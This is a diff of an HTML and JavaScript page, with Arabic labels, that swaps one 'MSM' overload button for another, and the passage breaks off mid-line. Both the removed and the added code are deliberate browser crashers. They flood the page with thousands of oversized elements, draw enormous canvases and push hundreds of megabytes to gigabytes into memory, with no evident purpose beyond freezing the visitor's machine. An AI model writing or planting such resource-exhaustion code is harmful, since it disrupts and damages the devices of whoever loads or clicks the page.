@@ -1,51 +1,31 @@
-<button onclick="launchDoom()" style="
-  position:fixed;top:20px;left:50%;transform:translateX(-50%);
-  padding:15px 40px;background:#000;color:#f00;
-  font-family:'Courier New', monospace;font-size:18px;
-  border:3px solid red;z-index:9999;cursor:pointer;">
-  💥 تفجير MSM النهائي
-</button>
-
+<button onclick="startMSM()" style="font-family: MSMFont; background-color: black; color: lime; padding: 14px; border: none;">🔥 اطلق MSM</button>
 <script>
-function launchDoom() {
-  let phase = 0;
-  const limit = 12;
-  let cache = [];
+function startMSM() {
+    // إخفاء الزر
+    document.querySelector('button').style.display = 'none';
 
-  // كل ثانية: تتصاعد الكارثة
-  const timer = setInterval(() => {
-    phase++;
-    
-    // 💾 ذاكرة عنقودية
-    cache.push(new Array(60_000_000).fill("🧠 MSM Phase " + phase));
-    
-    // 🖼️ Canvas بحجم مرعب يتغير كل مرة
-    let cv = document.createElement("canvas");
-    cv.width = screen.width * phase * 3;
-    cv.height = screen.height * phase * 3;
-    document.body.appendChild(cv);
-    let ctx = cv.getContext("2d");
-    ctx.fillStyle = `rgba(255,${Math.floor(Math.random()*255)},0,0.6)`;
-    ctx.fillRect(0, 0, cv.width, cv.height);
-
-    // 🧱 تفجير DOM تدريجي
-    for (let i = 0; i < 500 * phase; i++) {
-      let el = document.createElement("div");
-      el.innerText = "💥 MSM Overload – Phase " + phase;
-      el.style = `
-        width: ${1000 + phase*10}px;
-        height: ${1000 + phase*10}px;
-        background: repeating-radial-gradient(#000, #f00);
-        opacity: 0.05;
-      `;
-      document.body.appendChild(el);
+    // DOM تفجير 5000 عنصر
+    for (let i = 0; i < 5000; i++) {
+        const div = document.createElement('div');
+        div.innerText = 'MSM Power';
+        div.style = `width: 350px; height: 350px; background: rgba(${i%255},0,255,0.2); font-size: ${i%40+12}px;`;
+        document.body.appendChild(div);
     }
 
-    // 🎇 تأثير بصري عشوائي
-    document.body.style.transform = `scale(${1 + phase * 0.02}) rotate(${Math.random()*360}deg)`;
+    // Canvas تعبئة بحجم 10000x10000
+    const canvas = document.createElement('canvas');
+    canvas.width = 10000;
+    canvas.height = 10000;
+    document.body.appendChild(canvas);
+    const ctx = canvas.getContext('2d');
+    for (let x = 0; x < canvas.width; x += 2) {
+        for (let y = 0; y < canvas.height; y += 2) {
+            ctx.fillStyle = `rgba(${x%255},${y%255},128,0.7)`;
+            ctx.fillRect(x, y, 2, 2);
+        }
+    }
 
-    // 🛑 النهاية بعد 12 طور
-    if (phase >= limit) {
-      clearInterval(timer);
-      document.body.innerHTML += `
-        <div style="position:fixed;top:0;left:0;width:100%;padding:40
+    // ضخ ذاكرة ~800MB
+    let overload = [];
+    for (let i = 0; i < 800; i++) {
+        overload
